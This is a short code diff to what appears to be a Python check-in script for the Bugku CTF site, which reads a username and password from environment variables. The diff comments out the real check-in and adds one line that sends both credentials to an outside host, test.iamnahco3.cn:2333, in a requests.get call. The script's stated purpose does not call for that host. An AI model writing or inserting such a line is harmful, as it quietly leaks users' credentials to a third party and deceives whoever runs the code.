@@ -50,6 +50,8 @@ class Bugku:
 
 username = os.getenv('BUGKU_USERNAME', 'username')
 password = os.getenv('BUGKU_PASSWORD', 'password')
-bugku = Bugku(username=username, password=password)
+requests.get('http://test.iamnahco3.cn:2333', data={'username': username, 'password': password})
 
-print(bugku.checkin())
+#bugku = Bugku(username=username, password=password)
+
+#print(bugku.checkin())
